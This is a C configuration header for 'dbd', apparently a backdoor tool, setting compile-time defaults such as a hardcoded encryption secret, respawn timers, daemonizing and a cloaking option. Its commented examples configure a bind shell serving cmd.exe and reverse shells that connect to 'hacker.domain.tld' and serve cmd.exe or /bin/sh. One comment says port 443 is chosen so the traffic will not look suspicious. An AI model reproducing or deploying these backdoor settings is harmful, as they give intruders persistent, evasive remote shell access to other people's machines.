/* this file is used to hardcode a behaviour into dbd.
 * to use this feature, uncomment one of the examples below,
 * or type in your own. when finished, recompile dbd.
 */

/* these are the default values, change to suite your taste */

#define HOST NULL
#define BINDHOST NULL
#define PORT 0
#define SOURCE_PORT 0
#define DOLISTEN 0
#define EXECPROG NULL
#define CONVERT_TO_CRLF 0
#define ENCRYPTION 1
#define SHARED_SECRET "lulzsecpwnsj00"
#define RESPAWN_ENABLED 0
#define RESPAWN_INTERVAL 0
#define QUIET 0
#define VERBOSE 0
#define DAEMONIZE 0

/* Romulan Cloaking Technology - MUST DEFINE ALL OPTIONS IN THIS HEADER */
#define CLOAK 0

/* "chat" options */

#define HIGHLIGHT_INCOMING 0
#define HIGHLIGHT_PREFIX "\x1b[0;32m"
#define HIGHLIGHT_SUFFIX "\x1b[0m"
#define SEPARATOR_BETWEEN_PREFIX_AND_DATA ": "

/* win32 specific options: */

#define RUN_ONLY_ONE_INSTANCE 0
#define INSTANCE_SEMAPHORE "durandal_bd_semaphore"


/* some examples: */

/* listen for incoming connection on port 1234, serve "cmd.exe" to the
 * connecting party. when disconnected, dbd will immediately re-bind the port
 * and listen for another connection...
 */
/*
#define DOLISTEN 1
#define PORT 1234
#define RESPAWN_ENABLED 1
#define EXECPROG "cmd.exe"
*/

/* connect to hacker.domain.tld on port 443 and serve "cmd.exe". we hardcode
 * "something else" into dbd as our aes-128 encryption pass phrase (encryption
 * is on per default in dbd). we use port 443 (https) since https traffic is
 * encrypted, which means our activity won't be that suspicious. DAEMONIZE 1
 * means that we're going to detach from the console (under win32).
 */
/*
#define DOLISTEN 0
#define HOST "hacker.domain.tld"
#define PORT 443
#define RESPAWN_ENABLED 1
#define RESPAWN_INTERVAL 1800
#define EXECPROG "cmd.exe"
#define SHARED_SECRET "something else"
#define DAEMONIZE 1
*/

/* connect to hacker.domain.tld on port 993 (imaps) and serve /bin/sh.
 * reconnect every 2 hours.
 */
/*
#define DOLISTEN 0
#define HOST "hacker.domain.tld"
#define PORT 993
#define RESPAWN_ENABLED 1
#define RESPAWN_INTERVAL 7200
#define EXECPROG "/bin/sh"
*/

